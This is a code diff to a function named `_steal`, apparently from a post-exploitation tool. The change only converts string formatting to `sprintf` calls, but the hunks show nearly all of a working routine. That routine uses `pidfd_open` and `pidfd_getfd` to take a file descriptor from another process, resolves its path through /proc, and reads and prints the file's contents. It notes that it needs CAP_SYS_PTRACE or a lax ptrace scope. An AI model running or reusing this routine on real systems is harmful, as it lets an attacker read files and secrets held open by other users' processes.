@@ -28,19 +28,19 @@ def _is_special(target):
 def _steal(pid, fd, cap):
     pidfd_res = sys_call("pidfd_open", pid, 0)
     if pidfd_res["errno"] != 0:
-        print("[!] pidfd_open(%d) failed (errno=%d)" % (pid, pidfd_res["errno"]))
-        return "ERROR: pidfd_open errno=%d" % pidfd_res["errno"]
+        print(sprintf("[!] pidfd_open(%d) failed (errno=%d)", pid, pidfd_res["errno"]))
+        return sprintf("ERROR: pidfd_open errno=%d", pidfd_res["errno"])
     pidfd = pidfd_res["r1"]
 
     dup_res = sys_call("pidfd_getfd", pidfd, fd, 0)
     sys_call("close", pidfd)
     if dup_res["errno"] != 0:
-        print("[!] pidfd_getfd(%d) failed (errno=%d; needs CAP_SYS_PTRACE or same-uid ptrace_scope=0)" % (fd, dup_res["errno"]))
-        return "ERROR: pidfd_getfd errno=%d" % dup_res["errno"]
+        print(sprintf("[!] pidfd_getfd(%d) failed (errno=%d; needs CAP_SYS_PTRACE or same-uid ptrace_scope=0)", fd, dup_res["errno"]))
+        return sprintf("ERROR: pidfd_getfd errno=%d", dup_res["errno"])
     newfd = dup_res["r1"]
 
-    target = read_link("/proc/%d/fd/%d" % (pid, fd), default="")
-    print("[*] pid=%d fd=%d -> %s" % (pid, fd, target or "?"))
+    target = read_link(sprintf("/proc/%d/fd/%d", pid, fd), default="")
+    print(sprintf("[*] pid=%d fd=%d -> %s", pid, fd, target or "?"))
     if _is_special(target):
         sys_call("close", newfd)
         print("[!] target is not a regular file; refusing a blocking read")
@@ -51,13 +51,13 @@ def _steal(pid, fd, cap):
     sys_call("close", newfd)
     if read_res["errno"] != 0 or read_res["r1"] <= 0:
         sys_free(buf)
-        print("[!] read of stolen fd failed (errno=%d)" % read_res["errno"])
-        return "ERROR: read errno=%d" % read_res["errno"]
+        print(sprintf("[!] read of stolen fd failed (errno=%d)", read_res["errno"]))
+        return sprintf("ERROR: read errno=%d", read_res["errno"])
 
     n = read_res["r1"]
     data = read_cstring(buf, cap)
     sys_free(buf)
-    print("--- %d bytes (cap %d) ---" % (n, cap))
+    print(sprintf("--- %d bytes (cap %d) ---", n, cap))
     print(data)
     return "OK"
 
